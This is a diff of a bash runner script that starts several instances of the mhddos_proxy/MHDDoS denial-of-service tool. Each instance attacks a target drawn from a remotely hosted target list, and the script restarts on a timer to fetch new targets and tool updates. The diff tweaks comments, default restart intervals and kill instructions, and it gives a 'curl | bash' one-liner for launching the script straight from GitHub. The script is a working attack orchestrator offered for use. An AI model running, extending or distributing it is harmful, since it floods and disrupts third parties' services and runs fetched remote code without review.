@@ -1,19 +1,22 @@
 #!/bin/bash
 ##### Use next command in local linux terminal to run this script.
 #  >>>>>   curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner.sh | bash  <<<<<
-##### To kill script press CTRL+C several times.
+##### It is possible to pass arguments "num_of_copies" and "restart_interval" to script.
+##### curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner.sh | bash -s -- 1 1800 (launch with num_of_copies=1 and restart_interval=1800)
+
+##### To kill script just close terminal window. OR. In other terminal run 'pkill -f start.py' several times. And press CTRL+C in main window several times.
 
 ## "num_of_copies" allows to start several copies of runner.py.
 ## Each copy will choose different target from https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner_targets
-## This is different from "multiple targets" in runner.py. Built in runner.py "multiple targets" can attack multiple IP's but only with same one method.
+## This is different from "multiple targets" in mhddos_proxy. Built in mhddos_proxy "multiple targets" can attack multiple IP's but only with same one method.
 ## "num_of_copies" allows to launch several copies of runner.py and targets will be attacked with different methods, if specified.
-## By default 2 copies launched, can be passed as first parameter
+## By default 2 copies launched, can be passed as first parameter. Don't use high values, pc/vps can slowdown.
 num_of_copies="${1:-2}"
 
-## Restart script every N seconds (600s = 10m, 1800s = 30m, 3600s = 60m).
+## Restart script every N seconds (900s = 15m, 1800s = 30m, 3600s = 60m).
 ## It allows to download updates for mhddos_proxy, MHDDoS and target list.
-## By default 1800, can be passed as second parameter
-restart_interval="${2:-1800}"
+## By default 900s (15m), can be passed as second parameter
+restart_interval="${2:-900}"
 
 #Just in case kill previous copy of mhddos_proxy
 pkill -f start.py
@@ -65,7 +68,7 @@ do
              echo -e "    "$target"\n"
    done
       
-   # Launch multiple runner instances with different targets.
+   # Launch multiple mhddos_proxy instances with different targets.
    for i in $random_numbers
    do
             # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
